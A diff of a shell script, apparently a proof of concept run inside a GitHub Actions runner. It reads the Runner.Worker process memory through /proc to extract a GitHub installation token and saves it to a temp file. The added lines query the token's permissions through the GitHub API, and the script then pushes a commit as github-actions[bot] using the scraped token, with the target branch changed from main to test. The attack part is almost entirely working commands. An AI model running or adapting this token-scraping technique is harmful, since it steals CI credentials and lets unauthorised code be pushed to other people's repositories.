@@ -71,8 +71,11 @@ sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/map
 echo "--- also try ASCII encoding ---"
 test -s /tmp/t.txt || sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings | grep -oP 'ghs_15368_[A-Za-z0-9_.=-]{20,}' | head -1 > /tmp/t.txt
 echo "found: $(cat /tmp/t.txt | cut -c1-30)..."
+
+curl -s -H "Authorization: token $(cat /tmp/t.txt)" https://api.github.com/installation/repositories | jq '.repositories[0].permissions | to_entries[] | "\(.key): \(.value)"' -r
+
 echo "--- pushing hello_there.txt to main ---"
-cd $GITHUB_WORKSPACE && echo 'hello there' > hello_there.txt && git add hello_there.txt && git -c user.name='github-actions[bot]' -c user.email='41898282+github-actions[bot]@users.noreply.github.com' commit -m 'add hello_there.txt' && git remote set-url origin "https://x-access-token:$(cat /tmp/t.txt)@github.com/${GITHUB_REPOSITORY}.git" && git push origin HEAD:main
+cd $GITHUB_WORKSPACE && echo 'hello there' > hello_there.txt && git add hello_there.txt && git -c user.name='github-actions[bot]' -c user.email='41898282+github-actions[bot]@users.noreply.github.com' commit -m 'add hello_there.txt' && git remote set-url origin "https://x-access-token:$(cat /tmp/t.txt)@github.com/${GITHUB_REPOSITORY}.git" && git push origin HEAD:test
 CMDEOF
 # ----------------------------------------
 
